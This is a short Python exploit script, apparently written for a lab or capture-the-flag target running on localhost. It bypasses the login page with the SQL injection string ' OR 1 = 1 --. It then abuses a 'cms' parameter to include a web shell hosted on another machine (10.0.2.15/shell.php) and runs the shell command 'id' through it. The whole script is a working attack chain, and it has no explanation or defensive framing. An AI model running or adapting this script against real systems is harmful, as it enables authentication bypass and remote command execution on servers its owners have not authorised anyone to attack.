import requests

s = requests.Session()
payload="id"

r = s.post("http://localhost:5104/login.php", {"username":"' OR 1 = 1 --", "password":"123"})

r = s.get(f"http://localhost:5104?cms=http://10.0.2.15/shell.php&cmd={payload}")

print(r.text)